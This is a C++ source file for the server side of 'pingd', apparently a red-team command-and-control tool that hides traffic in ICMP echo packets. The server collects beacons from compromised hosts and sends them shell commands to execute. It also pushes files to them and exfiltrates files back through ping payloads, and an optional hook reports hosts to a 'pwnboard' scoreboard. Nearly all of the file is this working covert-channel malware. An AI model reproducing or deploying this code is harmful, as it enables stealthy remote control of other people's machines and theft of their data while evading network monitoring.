#include <map>
#include <iostream>
#include <cstdio>
#include <cstring>
#include <vector>
#include <sstream>
#include <thread>

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netdb.h>

static const std::string command_pipe = "/tmp/pingd_command";
static const std::string host_info_pipe = "/tmp/pingd_host_info";

/**
 * @brief Calculates checksum of an array of data.
 *
 * @param vdata pointer to array
 * @param size size of array
 * @return 2 byte checksum
 */
static uint16_t checksum(void *vdata, uint32_t size)
{
  uint8_t *data = (uint8_t *)vdata;

  // Initialise the accumulator.
  uint64_t acc = 0xffff;

  // Handle any partial block at the start of the data.
  unsigned int offset = ((uintptr_t)data) & 3;
  if (offset) {
    size_t count = 4 - offset;
    if (count > size)
      count = size;
    uint32_t word = 0;
    memcpy(offset + (char *)&word, data, count);
    acc += ntohl(word);
    data += count;
    size -= count;
  }

  // Handle any complete 32-bit blocks.
  uint8_t *data_end = data + (size & ~3);
  while (data != data_end) {
    uint32_t word;
    memcpy(&word, data, 4);
    acc += ntohl(word);
    data += 4;
  }
  size &= 3;

  // Handle any partial block at the end of the data.
  if (size) {
    uint32_t word = 0;
    memcpy(&word, data, size);
    acc += ntohl(word);
  }

  // Handle deferred carries.
  acc = (acc & 0xffffffff) + (acc >> 32);
  while (acc >> 16) {
    acc = (acc & 0xffff) + (acc >> 16);
  }

  // If the data began at an odd byte address
  // then reverse the byte order to compensate.
  if (offset & 1) {
    acc = ((acc & 0xff00) >> 8) | ((acc & 0x00ff) << 8);
  }

  // Return the checksum in network byte order.
  return ~acc;
}

/**
 * @brief Splits an string into an array using a space as the delimiter.
 *
 * @param input string to split
 * @return vector of strings
 */
std::vector<std::string> split_input(const std::string &input)
{
  std::vector<std::string> ret;
  std::istringstream iss(input);
  for (std::string s; iss >> s;) {
    ret.push_back(s);
  }
  return ret;
}

/**
 * @brief Sends an ICMP echo reply to a specified ip.
 *
 * Allows for user to specify the data field.
 *
 * @param sockfd socket file descriptor to use
 * @param dst destination IPv4 string to use
 * @param buf buffer to fill data section with
 * @param size size of buffer to send
 */
long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
{
  uint8_t out[1024];// outgoing buffer used to send ping

  icmphdr *icmp = (icmphdr *)out;
  icmp->type = 0;// reply
  icmp->code = 0;
  icmp->checksum = 0;
  icmp->un.echo.sequence++;

  // copy buffer to data section
  if (buf && size > 0) {
    memcpy(&out[sizeof(icmphdr)], buf, size);
  }

  // calculate checksum and change byte order
  icmp->checksum = htons(checksum(out, sizeof(icmphdr) + size));

  // construct IP address from dst string
  sockaddr_in addr_;
  addr_.sin_family = AF_INET;
  addr_.sin_port = htons(0);
  addr_.sin_addr.s_addr = inet_addr(dst.c_str());

  // send data
  long ret;
  if ((ret = sendto(sockfd, out, sizeof(icmphdr) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1) {
    perror("sendto");
  }
  return ret;
}

/**
 * @brief Recieves an ICMP echo request and stores the IP.
 *
 * Can read data entry into the specified buffer
 *
 * @param sockfd socket file descriptor to use
 * @param src string to store source IPv4 in
 * @param buf buffer to fill with data section
 * @param size size of buffer to receive into
 */
long recv_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
{
  long ret = 0;
  uint8_t in[1024];
  if ((ret = read(sockfd, in, sizeof(in))) == -1) {
    return -1;
  }

  iphdr *ip = (iphdr *)in;
  if (ret > sizeof(iphdr)) {
    in_addr addr{ ip->saddr };
    char *src_ = inet_ntoa(addr);
    src = src_;

    if (ret > sizeof(iphdr) + sizeof(icmphdr)) {
      if (buf && size > 0) {
        memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), ret - sizeof(iphdr) - sizeof(icmphdr));
      }
    }
  }

  return ret - sizeof(iphdr) - sizeof(icmphdr);
}

/**
 * @brief Listener thread for receiving beacons.
 *
 * Listens for hosts to ping the server.
 */
void listen_task()
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    std::exit(-1);
  }

  int pipefd;
  if ((pipefd = open(host_info_pipe.c_str(), O_WRONLY)) == -1) {
    perror("open()");
    std::exit(-1);
  }

  // create a buffer to store received data
  uint8_t in[1024];
  while (1) {
    // fill buffer with zeroes
    memset(in, 0, 1024);

    // receive a ping and store the ip addres
    std::string src_ip;
    ssize_t num_bytes = recv_ping(sockfd, src_ip, in, sizeof(in));

    if (num_bytes > 0) {
      char *hostname_ = (char *)in;
      std::string hostname = hostname_;

      // only store hostname into active connections list if a beacon is sent
      auto split = split_input(hostname);
      if (split.size() < 1) {
        continue;
      }
      if (split.at(0).compare("(beacon)") == 0) {
        std::string key = split.at(1);
        key.append("@");
        key.append(src_ip);
        long nbytes;
        if ((nbytes = write(pipefd, key.c_str(), key.size())) == -1) {
          perror("write()");
        }

#ifdef PWNBOARD
        std::string pwnboard_cmd = "./pwnboard.sh ";
        pwnboard_cmd.append(src_ip);
        pwnboard_cmd.append(" ");
        pwnboard_cmd.append("pingd");
        system(pwnboard_cmd.c_str());
#endif// PWNBOARD
      }
    }
  }
}

/**
 * @brief Sends a command to be executed on a designated ip address
 *
 * @param dst ip address to send command
 * @param command string command to execute
 */
void send_command(const std::string &dst, const std::string &command)
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    exit(-1);
  }

  // prepend command with run so the client knows what to do with this packet
  std::string cmd = "run ";
  cmd.append(command);

  // send the commmand to be executed
  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  // listen for response packets
  while (1) {
    uint8_t in[512];

    // receive a ping and store the ip addres
    std::string src_ip;
    ssize_t num_bytes = recv_ping(sockfd, src_ip, in, sizeof(in));

    if (dst != src_ip)
      continue;

    if (num_bytes > 0) {

      char *str_ = (char *)in;
      std::string str(str_, num_bytes);

      // only store hostname into active connections list if a beacon is sent
      auto split = split_input(str);
      if (split.at(0).compare("(beacon)") != 0) {
        // put command ouput to stdout
        std::fputs(str.c_str(), stdout);
      }
    } else {
      break;
    }
  }
}

/**
 * @brief Sends a file to be copied to a designated file location on the host
 *
 * @param dst ip address to send file
 * @param src_file filename of file to copy
 * @param dst_file filename of file to put on host
 */
void send_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    exit(-1);
  }

  // prepend command with file so the client knows what to do with this packet
  std::string cmd = "file ";
  cmd.append(dst_file);

  // send packet to host
  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  // open file on machine to read
  FILE *fp = fopen(src_file.c_str(), "rb");
  uint8_t out[512];
  if (fp == NULL) {
    perror("fopen");
    send_ping(sockfd, dst, NULL, 0);
    return;
  }

  size_t nbytes;
  do {
    // send file 512 bytes at a time to the host
    nbytes = fread(out, 1, sizeof(out), fp);
    send_ping(sockfd, dst, out, nbytes);
  } while (nbytes != 0);

  send_ping(sockfd, dst, NULL, 0);
}

/**
 * @brief Receives a file from a host machine to be saved at a designated location
 *
 * @param dst ip address to receive file from
 * @param src_file filename of file to copy into
 * @param dst_file filename of file to receive from on host
 */
void receive_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    exit(-1);
  }

  // prepend command with exfil so the client knows what to do with this packet
  std::string cmd = "exfil ";
  cmd.append(src_file);

  // send packet to host
  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  // open file to be written to
  FILE *fp = fopen(dst_file.c_str(), "wb+");
  if (fp == NULL) {
    perror("fopen");
    return;
  }

  while (1) {
    uint8_t in[512];
    // receive file 512 bytes at a time and write to file
    std::string src_ip;
    ssize_t num_bytes = recv_ping(sockfd, src_ip, in, sizeof(in));

    if (dst != src_ip)
      continue;

    if (num_bytes > 0) {
      char *str_ = (char *)in;
      std::string str(str_, num_bytes);

      // only store hostname into active connections list if a beacon is sent
      auto split = split_input(str);
      if (split.at(0).compare("(beacon)") != 0) {
        // put command ouput to stdout
        fwrite(in, 1, num_bytes, fp);
      }
    } else {
      fclose(fp);
      break;
    }
  }
}

int main(int argc, char **argv)
{

  int ret;
  umask(0);
  if ((ret = mkfifo(command_pipe.c_str(), S_IFIFO | 0666)) == -1) {
    if (errno != EEXIST) {
      perror("mkfifo");
      exit(-1);
    }
  }
  if ((ret = mkfifo(host_info_pipe.c_str(), S_IFIFO | 0666)) == -1) {
    if (errno != EEXIST) {
      perror("mkfifo");
      exit(-1);
    }
  }

  std::puts("Starting listening thread.");
  std::thread listen_thread(listen_task);
  listen_thread.detach();

  int pipefd;
  if ((pipefd = open(command_pipe.c_str(), O_RDWR)) == -1) {
    perror("open()");
    return -1;
  }

  while (1) {
    uint8_t buf[1024];
    size_t nbytes;
    if ((nbytes = read(pipefd, buf, 1024)) == -1) {
      perror("read()");
    }
    std::string cmd{ (char *)buf, nbytes };
    std::cout << "Read: " << cmd << "\n";
  }

  return 0;
}